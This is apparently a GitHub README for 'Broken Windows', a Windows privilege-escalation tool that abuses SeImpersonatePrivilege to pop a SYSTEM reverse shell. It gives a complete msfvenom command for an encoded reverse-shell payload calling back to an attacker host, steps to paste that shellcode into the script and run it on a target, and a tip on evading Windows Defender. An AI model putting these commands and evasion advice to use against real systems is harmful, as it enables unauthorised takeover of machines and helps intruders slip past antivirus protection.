# Broken Windows

## What is Broken Windows?

It's a privilege escalation tool for Windows. It leverages the access token of the user who runs it to eventually pop a reverse shell as SYSTEM. The user's access token **must** have the SeImpersonatePrivilege in order for Broken Windows to work. 

It can be run through the Python interpreter if it's available on your target system, or it can be run as a standalone executable.

## How can I convert the Broken Windows.py file to an executable?

Just follow these steps.

```
pip install pyinstaller
```
```
pyinstaller --onefile --console "/path/to/Broken Windows.py"
```

```Broken Windows.exe``` will be in the ```dist``` folder created by pyinstaller.

## How do I use it?

Generate a reverse shell with msfvenom. Remember to remove x64 from the command if your target system is 32 bit. If msfvenom fails to encode your reverse shell due to one of the bad bytes, run the command again.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=MACHINE_IP LPORT=PORT -f python -b "\x00,\xFF,\x0A,\x0D" -e x86/shikata_ga_nai -n 32
```

Copy the shellcode outputted by msfvenom and paste it into the ```BrokenWindows.py``` file, in the ```main``` function.

Then, simply execute ```Broken Windows.py``` or ```Broken Windows.exe``` on your target system:

![CMD](https://user-images.githubusercontent.com/16895391/129423983-a96c33b5-e0d9-458b-abee-128fb2ff0c5b.PNG)

![PYTHON](https://user-images.githubusercontent.com/16895391/129424058-05a8ed5d-4d8d-4e3b-9bac-c5ef72ffe6c9.PNG)

You (hopefully!) will receive a reverse shell as SYSTEM:

![SHELL](https://user-images.githubusercontent.com/16895391/129421207-727ed0e5-8175-4fb7-aa0a-0c1b3a77741c.PNG)

## Tips

I have noticed that Windows Defender (and possibly other AVs) **do not** detect any threats if you use the python interpreter to run Broken Windows instead of the executable. If you use the executable, most AVs runtime analysis will detect the reverse shell.
